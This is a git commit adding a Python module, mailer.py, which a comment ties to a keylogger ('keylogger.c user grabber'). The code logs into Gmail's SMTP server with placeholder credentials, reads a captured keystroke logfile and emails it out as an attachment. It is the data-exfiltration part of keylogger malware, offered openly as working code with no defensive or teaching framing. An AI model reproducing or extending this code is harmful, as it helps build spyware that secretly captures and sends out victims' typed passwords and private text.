95a4408213e2a2e6f70fa3fe25380f554ed5fa93
unknown <loganscott.lgs@gmail.com>
2022-04-27 02:47:25 -0400

    added module for emailing logfile -- unintegrated currently

---
+++ mailer.py
@@ -0,0 +1,25 @@
+import smtplib, ssl
+from email.mime.multipart import MIMEMultipart
+from email.mime.text import MIMEText
+
+# email setup
+email = "email@gmail.com"
+password = "password"
+
+# establish SMTP connection via TLS
+context = ssl.create_default_context()
+server = smtplib.SMTP('smtp.gmail.com', 587) # 587 for TLS
+server.starttls(context=context)
+server.login(email, password)
+
+# gather and prepare logfile
+filename = "username_LOG.txt" # based on keylogger.c user grabber
+f = open(filename, "r")
+logfile_attachment = MIMEText(f.read())
+logfile_attachment.add_header('Content-Disposition', 'attachment', filename=filename)
+message = MIMEMultipart('alternative')
+message.attach(logfile_attachment)
+
+# email the logfile
+server.sendmail(email, email, message.as_string()) # send and receive from same address
+server.quit()
